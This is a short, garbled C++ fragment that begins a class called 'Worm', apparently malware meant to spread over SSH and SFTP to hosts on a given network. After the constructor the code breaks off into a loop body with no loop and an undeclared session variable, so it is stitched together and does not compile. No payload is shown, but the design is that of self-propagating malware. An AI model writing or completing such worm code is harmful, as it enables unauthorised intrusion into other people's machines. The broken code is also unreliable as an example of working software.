#include <libssh/libssh.h>  // Include the SSH library
#include <libssh/sftp.h>    // Include the SFTP library for file transfer
#include <iostream>         // For input-output operations
#include <fstream>          // For file operations (though not used in this code)
#include <vector>           // For using vectors to store data
#include <sstream>          // For string stream operations to parse IP addresses

// Worm class to represent the worm functionality
class Worm {
private:
    std::string network;  // Store network address as a string

public:
    // Constructor to initialize the network address
    Worm(const std::string& network_address) : network(network_address) {}
                my_ssh_session = ssh_new();  // Create new SSH session
                if (my_ssh_session == NULL) {  // Check if session creation was successful
                    continue;
                }   

             
